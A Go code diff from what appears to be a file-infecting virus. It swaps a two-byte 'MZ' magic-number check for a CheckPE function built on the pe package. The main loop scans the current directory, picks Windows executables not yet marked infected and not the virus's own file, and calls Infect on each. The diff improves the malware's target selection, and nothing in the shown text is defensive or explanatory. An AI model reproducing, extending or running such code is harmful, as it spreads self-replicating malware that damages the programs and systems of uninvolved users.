@@ -42,21 +42,13 @@ func check(e error) {
     }
 }
 
-func CheckMZ(file string) bool {
-	
-	f, err := os.Open(file)
-    check(err)
-	bytes := make([]byte, 2) //read the magic number
-    f.Read(bytes)
-	f.Close()
-	
-	//check if is an PE
-	if strings.Contains(string(bytes), "MZ"){
-		return true 
-	} else {
-		return false
-	}
-
+func CheckPE(file string) bool {
+    
+    _, err := pe.Open(file)
+    if err != nil {
+        return false
+    }
+    return true
 }
 
 func CheckInfected(file string) bool {
@@ -211,7 +203,7 @@ func main() {
 
 	files, _ := ioutil.ReadDir(".")
 	for _, f := range files {
-		if CheckMZ(f.Name()) == true {
+		if CheckPE(f.Name()) == true {
 			if CheckInfected(f.Name()) == false {
 				if !strings.Contains(virPath, f.Name()) {
 					Infect(f.Name())
